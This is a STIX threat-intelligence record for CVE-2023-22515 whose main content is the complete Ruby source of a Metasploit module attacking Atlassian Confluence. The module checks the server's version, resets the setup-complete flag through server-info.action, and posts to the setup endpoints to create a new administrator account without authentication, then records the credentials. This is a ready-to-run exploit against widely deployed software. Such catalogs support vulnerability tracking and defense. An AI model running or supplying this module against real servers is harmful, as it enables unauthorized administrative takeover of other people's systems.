{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7796e560-b83b-4c7c-8a07-d59b488b6394",
    "created": "2024-08-14T16:23:35.641209Z",
    "modified": "2024-08-14T16:23:35.641213Z",
    "name": "Atlassian Confluence Data Center and Server Authentication Bypass via Broken Access Control",
    "description": " This module exploits a broken access control vulnerability in Atlassian Confluence servers leading to an authentication bypass. A specially crafted request can be create new admin account without authentication on the target Atlassian server. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/atlassian_confluence_auth_bypass.rb",
            "external_id": "atlassian_confluence_auth_bypass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-22515"
        },
        {
            "source_name": "reference",
            "url": "https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html"
        },
        {
            "source_name": "reference",
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-22515"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Atlassian Confluence Data Center and Server Authentication Bypass via Broken Access Control',\n        'Description' => %q{\n          This module exploits a broken access control vulnerability in Atlassian Confluence servers leading to an authentication bypass.\n          A specially crafted request can be create new admin account without authentication on the target Atlassian server.\n        },\n        'Author' => [\n          'Unknown', # exploited in the wild\n          'Emir Polat' # metasploit module\n        ],\n        'References' => [\n          ['CVE', '2023-22515'],\n          ['URL', 'https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html'],\n          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2023-22515'],\n          ['URL', 'https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis']\n        ],\n        'DisclosureDate' => '2023-10-04',\n        'DefaultOptions' => {\n          'RPORT' => 8090\n        },\n        'License' => MSF_LICENSE,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/']),\n      OptString.new('NEW_USERNAME', [true, 'Username to be used when creating a new user with admin privileges', Faker::Internet.username], regex: /^[a-z._@]+$/),\n      OptString.new('NEW_PASSWORD', [true, 'Password to be used when creating a new user with admin privileges', Rex::Text.rand_text_alpha(8)]),\n      OptString.new('NEW_EMAIL', [true, 'E-mail to be used when creating a new user with admin privileges', Faker::Internet.email])\n    ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/login.action')\n    )\n    return Exploit::CheckCode::Unknown unless res\n    return Exploit::CheckCode::Safe unless res.code == 200\n\n    poweredby = res.get_xml_document.xpath('//ul[@id=\"poweredby\"]/li[@class=\"print-only\"]/text()').first&.text\n    return Exploit::CheckCode::Safe unless poweredby =~ /Confluence (\\d+(\\.\\d+)*)/\n\n    confluence_version = Rex::Version.new(Regexp.last_match(1))\n\n    vprint_status(\"Detected Confluence version: #{confluence_version}\")\n\n    if confluence_version.between?(Rex::Version.new('8.0.0'), Rex::Version.new('8.3.2')) ||\n       confluence_version.between?(Rex::Version.new('8.4.0'), Rex::Version.new('8.4.2')) ||\n       confluence_version.between?(Rex::Version.new('8.5.0'), Rex::Version.new('8.5.1'))\n      return Exploit::CheckCode::Appears(\"Exploitable version of Confluence: #{confluence_version}\")\n    end\n\n    Exploit::CheckCode::Safe(\"Confluence version: #{confluence_version}\")\n  end\n\n  def run\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/server-info.action'),\n      'vars_get' => {\n        'bootstrapStatusProvider.applicationConfig.setupComplete' => 'false'\n      }\n    )\n\n    return fail_with(Msf::Exploit::Failure::UnexpectedReply, 'Version vulnerable but setup is already completed') unless res&.code == 302 || res&.code == 200\n\n    print_good('Found server-info.action! Trying to ignore setup.')\n\n    created_user = create_admin_user\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'setup/finishsetup.action'),\n      'headers' => {\n        'X-Atlassian-Token' => 'no-check'\n      }\n    )\n\n    return fail_with(Msf::Exploit::Failure::NoAccess, 'The admin user could not be created. Try a different username.') unless created_user\n\n    print_warning('Admin user was created but setup could not be completed.') unless res&.code == 200\n\n    create_credential({\n      workspace_id: myworkspace_id,\n      origin_type: :service,\n      module_fullname: fullname,\n      username: datastore['NEW_USERNAME'],\n      private_type: :password,\n      private_data: datastore['NEW_PASSWORD'],\n      service_name: 'Atlassian Confluence',\n      address: datastore['RHOST'],\n      port: datastore['RPORT'],\n      protocol: 'tcp',\n      status: Metasploit::Model::Login::Status::UNTRIED\n    })\n\n    print_good(\"Admin user was created successfully. Credentials: #{datastore['NEW_USERNAME']} - #{datastore['NEW_PASSWORD']}\")\n    print_good(\"Now you can login as administrator from: http://#{datastore['RHOSTS']}:#{datastore['RPORT']}#{datastore['TARGETURI']}login.action\")\n  end\n\n  def create_admin_user\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'setup/setupadministrator.action'),\n      'headers' => {\n        'X-Atlassian-Token' => 'no-check'\n      },\n      'vars_post' => {\n        'username' => datastore['NEW_USERNAME'],\n        'fullName' => 'New Admin',\n        'email' => datastore['NEW_EMAIL'],\n        'password' => datastore['NEW_PASSWORD'],\n        'confirm' => datastore['NEW_PASSWORD'],\n        'setup-next-button' => 'Next'\n      }\n    )\n    res&.code == 302\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-10-04"
}